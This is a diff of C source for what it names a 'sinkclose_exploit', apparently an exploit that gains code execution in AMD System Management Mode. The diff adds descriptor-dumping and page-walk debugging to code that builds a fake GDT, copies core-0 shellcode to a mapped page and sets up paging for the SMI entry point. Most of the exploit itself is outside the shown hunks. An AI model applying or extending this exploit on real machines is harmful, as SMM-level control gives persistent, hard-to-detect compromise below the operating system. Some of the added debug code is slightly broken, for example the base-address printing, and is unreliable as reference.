@@ -13,9 +13,7 @@
 #include <unistd.h>
 #endif
 
-extern "C" {
-	void _core0_shell();
-}
+extern "C" void _core0_shell();
 
 void hexdump(const char *data, size_t size, uint64_t offset);
 
@@ -54,7 +52,7 @@ void hexdump(const char *data, size_t size, uint64_t offset);
 #define PG_AUX_DATA_ENTRY       0x1FF
 
 
-#define CORENUM 16
+#define CORENUM 64
 /*
 >>> print_idxs(0xfffff6fb7dbff000)
 pte-i : 1ff
@@ -428,6 +426,31 @@ void set_tclose_for_core(UINT32 core_id) {
     0070: 00 00 00 00 00 00 00 00 04 00 00 00 00 f5 40 00
 */
 
+// Access and granularity flags structure
+struct SegmentDescriptor {
+    uint16_t limit_low;          // Lower 16 bits of the segment limit
+    uint16_t base_low;           // Lower 16 bits of the base address
+    uint8_t  base_middle;        // Next 8 bits of the base address
+
+    // Access byte
+    uint8_t accessed : 1;        // Segment accessed flag
+    uint8_t readable_or_writable : 1; // Readable (code seg) / Writable (data seg)
+    uint8_t conforming_or_expand_down : 1; // Conforming (code) / Expand-down (data)
+    uint8_t executable : 1;      // Executable segment flag (code or data)
+    uint8_t descriptor_type : 1; // Descriptor type (1 = code/data, 0 = system)
+    uint8_t dpl : 2;             // Descriptor Privilege Level (0-3)
+    uint8_t present : 1;         // Segment present in memory
+
+    // Granularity byte
+    uint8_t limit_high : 4;      // Upper 4 bits of the segment limit
+    uint8_t available : 1;       // Available for OS use (AVL)
+    uint8_t long_mode : 1;       // Long mode (64-bit code, 0 for 32-bit segments)
+    uint8_t default_op_size : 1; // Default operation size (0 = 16-bit, 1 = 32-bit)
+    uint8_t granularity : 1;     // Granularity (0 = byte, 1 = 4 KB)
+
+    uint8_t base_high;           // Last 8 bits of the base address
+} __attribute__((packed));
+
 unsigned char FAKE_GDT[] = {
     // NULL Descriptor
     /*0x00*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -492,7 +515,7 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
     // Copy 32bit Core0_shell
     memcpy(shellcode_page, (void *) _core0_shell, sh_len);
 
-    hexdump(shellcode_page, sh_len, CORE0_SHELLCODE_ADDRESS);
+    hexdump(shellcode_page, sh_len, 0);
 
     // Write to the mapped region
 
@@ -920,7 +943,14 @@ void prepare_paging(
      ..
     */
 
+/*     struct alloc_user_physmem l2_page = {0};
+    if (alloc_user_mem(PAGE_SIZE, &l2_page) == FALSE) {
+        printf("failed to allocate page for l2_page\n");
+        exit(-1);
+    }
+    memset((void *) l2_page.va, 0x00, PAGE_SIZE); */
 
+    // Reserver a page for the PDPT
     memset((void *) pdpt_page->va, 0x00, PAGE_SIZE);
 
     // Map LARGE 1G Entries to cover 4Gigs (indentity mapped)
@@ -1059,7 +1089,8 @@ UINT32 get_smi_handler_size() {
 void hexdump(const char *data, size_t size, uint64_t offset) {
     const size_t bytes_per_line = 16; // Number of bytes to display per line
     for (size_t i = 0; i < size; i += bytes_per_line) {
-        printf("%016zx;  ", i+offset); // Print the offset
+        if (offset != 0)
+            printf("%016zx;  ", i+offset); // Print the offset
 
         // Print the hex values for this line
         for (size_t j = 0; j < bytes_per_line; j++) {
@@ -1069,21 +1100,51 @@ void hexdump(const char *data, size_t size, uint64_t offset) {
                 printf("   "); // Pad with spaces if we are at the end
             }
         }
-
-        printf(" |"); // Separator between hex and ASCII
-
-        // Print the ASCII representation for this line
-        for (size_t j = 0; j < bytes_per_line; j++) {
-            if (i + j < size) {
-                char c = data[i + j];
-                printf("%c", isprint((unsigned char)c) ? c : '.');
-            } else {
-                printf(" "); // Pad with spaces if we are at the end
-            }
-        }
-
-        printf("|\n");
+        printf("\n");
     }
+}
+
+static void print_desc(struct SegmentDescriptor *sec_desc) {
+    printf("SegDescHex 0x%016lx\n", ((UINT64 *)sec_desc));
+    printf("Segment Descriptor Fields:\n");
+    printf("--------------------------\n");
+    printf("Base Address     : 0x%08X\n", sec_desc->base_low);
+    printf("Segment Limit : 0x%05X\n", sec_desc->limit_high << 16 | sec_desc->limit_low);
+    printf("Access Byte:\n");
+    printf("  Accessed       : %d\n", sec_desc->accessed);
+    printf("  Read/Writable  : %d\n", sec_desc->readable_or_writable);
+    printf("  Conforming/Exp : %d\n", sec_desc->conforming_or_expand_down);
+    printf("  Executable     : %d\n", sec_desc->executable);
+    printf("  Descriptor Type: %d\n", sec_desc->descriptor_type);
+    printf("  DPL            : %d\n", sec_desc->dpl);
+    printf("  Present        : %d\n", sec_desc->present);
+    printf("Granularity Byte:\n");
+    printf("  Limit High     : 0x%01X\n", sec_desc->limit_high);
+    printf("  AVL            : %d\n", sec_desc->available);
+    printf("  Long Mode      : %d\n", sec_desc->long_mode);
+    printf("  Default Size   : %d\n", sec_desc->default_op_size);
+    printf("  Granularity    : %d\n", sec_desc->granularity);
+    printf("--------------------------\n");
+}
+
+static void do_page_walk(UINT64 crbase, UINT64 addr){
+    void* basePTR = map_physical_memory(CORE0_PML4, PAGE_SIZE);
+
+    UINT64 pml4e = (addr >> 39) & 0x1FF;
+    UINT64 pdpte = (addr >> 30) & 0x1FF;
+    UINT64 pde = (addr >> 21) & 0x1FF;
+
+    UINT64 pml4e_addr = ((UINT64*)basePTR)[pml4e];
+    // Clear the lower 12 bits
+    printf("PML4E: %016llx\n", pml4e_addr);
+    pml4e_addr &= ~(0xFFFULL);
+    unmap_physical_memory(basePTR, PAGE_SIZE);
+    printf("PML4E: %016llx\n", pml4e_addr);
+
+/*     void *pdpt = map_physical_memory(pml4e_addr, PAGE_SIZE);
+
+    UINT64 pdpte_addr = ((UINT64*)pdpte)[pdpte];
+    unmap_physical_memory(pdpt, PAGE_SIZE); */
 }
 
 extern void amd_print_smm_tseg_addr_for_core(int core);
@@ -1139,6 +1200,14 @@ void sinkclose_exploit()
     hexdump((char*)gdt_physpage, 0x60, 0x00000000);
 
     free(gdt);
+
+    struct SegmentDescriptor *sec_desc = (struct SegmentDescriptor *) &FAKE_GDT;
+
+
+    printf("--- 32 Bit CS Descriptor ---\n");
+    print_desc(&sec_desc[1]);
+    printf("--- 64 Bit CS Descriptor ---\n");
+    print_desc(&sec_desc[7]);
 
     unmap_physical_memory(gdt_physpage, PAGE_SIZE);
 
@@ -1199,6 +1268,11 @@ void sinkclose_exploit()
         printf("failed to allocate page for PDPT\n");
         exit(-1);
     }
+    if (pdpt_page.pa == 0){
+        printf("PDPT: %016llx\n", pdpt_page.pa);
+        printf("REREUN with sudo\n");
+        return;
+    }
 
     memset((void *)pdpt_page.va, 0x00, PAGE_SIZE);
 
@@ -1210,7 +1284,7 @@ void sinkclose_exploit()
         aux_data_page.pa 
     );
 
-
+    do_page_walk(CORE0_PML4, 0x00000000);
     // Setup the aux buff
 
     struct _x64_staging_aux_data *aux_data = 
